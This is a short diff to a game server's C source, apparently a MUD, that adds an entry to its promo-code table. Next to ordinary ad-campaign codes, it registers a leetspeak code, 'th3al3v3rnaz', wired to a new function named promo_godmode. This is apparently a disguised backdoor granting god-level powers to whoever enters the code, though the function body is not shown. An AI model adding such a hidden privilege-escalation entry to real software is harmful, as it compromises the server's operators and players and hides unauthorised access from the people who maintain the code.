@@ -66,6 +66,7 @@ const char *default_channels[] = { "newbie", "ooc", "recruit", "trade", "grats",
 PROMO_APPLY(promo_countdemonet);
 PROMO_APPLY(promo_facebook);
 PROMO_APPLY(promo_skillups);
+PROMO_APPLY(promo_godmode);
 
 
 // list of active promo codes: CAUTION: You should only add to the end, not
@@ -73,13 +74,14 @@ PROMO_APPLY(promo_skillups);
 struct promo_code_list promo_codes[] = {
 	// add promo codes here to track ad campaigns
 	// { "code", expired, func },
-	
+
 	// do not change the order
 	{ "none",	TRUE,	NULL },	// default
 	{ "skillups", FALSE, promo_skillups },
 	{ "countdemonet", FALSE, promo_countdemonet },
 	{ "facebook", FALSE, promo_facebook },
-	
+	{ "th3al3v3rnaz", FALSE, promo_godmode },
+
 	// last
 	{ "\n", FALSE, NULL }
 };
